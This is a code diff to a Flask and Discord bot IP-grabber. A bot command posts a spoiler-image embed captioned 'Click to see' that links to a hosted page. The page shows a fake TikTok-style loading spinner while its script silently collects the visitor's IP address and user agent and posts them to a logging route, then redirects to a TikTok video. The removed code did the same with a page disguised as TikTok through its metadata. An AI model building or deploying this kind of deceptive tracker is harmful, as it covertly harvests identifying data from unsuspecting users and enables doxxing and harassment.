@@ -21,51 +21,42 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 # ---------------------
 
-# This is what they see when they click the spoiler blur.
-# It looks exactly like a TikTok video loading.
-HTML_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title>
-    <meta property="og:type" content="video.other">
-    <meta property="og:site_name" content="TikTok">
-    <meta property="og:title" content="TikTok - Make Your Day">
-    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-    <style>
-        body { margin: 0; padding: 0; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <script>
-        // Grab IP instantly
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => {
-                fetch('/log', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
-                }).then(() => {
-                    window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
-                });
-            })
-            .catch(() => {
-                window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
-            });
-    </script>
-</body>
-</html>
-"""
-
+# The page they hit when they click the spoiler image
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Redirecting...</title>
+        <style>
+            body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+            .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        </style>
+    </head>
+    <body>
+        <div class="loader"></div>
+        <script>
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
+                    }).then(() => {
+                        window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
+                    });
+                })
+                .catch(() => {
+                    window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
+                });
+        </script>
+    </body>
+    </html>
+    """)
 
 @app.route('/log', methods=['POST'])
 def log():
@@ -104,9 +95,22 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # SPOILER TAGS: ||link||
-    # This makes the link blurred out. They click the blur, they get redirected.
-    await ctx.send(f"||{RAILWAY_URL}||")
+    try:
+        # Loads the image you just uploaded
+        file = discord.File("image.png", filename="SPOILER_image.png")
+    except Exception as e:
+        await ctx.send(f"Error: Could not find image.png. {e}")
+        return
+
+    # This creates the clickable link wrapper around the image
+    embed = discord.Embed(
+        title="Click to see",
+        url=RAILWAY_URL,
+        color=0x2b2d31
+    )
+    embed.set_image(url="attachment://SPOILER_image.png")
+
+    await ctx.send(embed=embed, file=file)
 
 def run_bot():
     if not BOT_TOKEN:
